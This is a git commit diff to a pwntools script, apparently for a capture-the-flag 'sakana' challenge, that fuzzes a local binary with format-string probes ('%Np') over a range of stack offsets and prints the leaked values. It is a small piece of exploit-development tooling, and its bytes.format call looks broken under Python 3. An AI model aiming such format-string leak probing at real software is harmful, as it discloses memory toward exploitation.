77d19f89e6b3e969b7877164b0a9e7c3a91de70e
elite3312 <perrywu12@gmail.com>
2022-10-29 22:59:45 +0800

    fuzz

--- pwn/sakana/fuzz.py
+++ pwn/sakana/fuzz.py
@@ -2,16 +2,17 @@ from pwn import *
 #automatically get context arch
 elf=context.binary=ELF('pwn/sakana/sakana',checksec=False)
 
-for i in range(100):
+for i in range(264,264+100):
     try:
+       
         #level used to reduce noise
         p=process(level='error')
-        p.sendlineafter(b'>','printf')
-        p.sendline(b'aaa %{}p'.format(i).encode())
+        #p.sendlineafter(b'~>',b'printf')
+        p.sendline(b'printf')
+        p.sendline(b'%{}p'.format(i).encode())
         sleep(0.01)
-        p.recvuntil('>')
-        result= p.recvlines(2)[0].split(' ')[-1:]
-        if result :
-            print(str(i)+': '+str(result).strip())
+      
+        result= p.recvline()
+        print(str(i)+': '+str(result).strip())
     except:
         pass
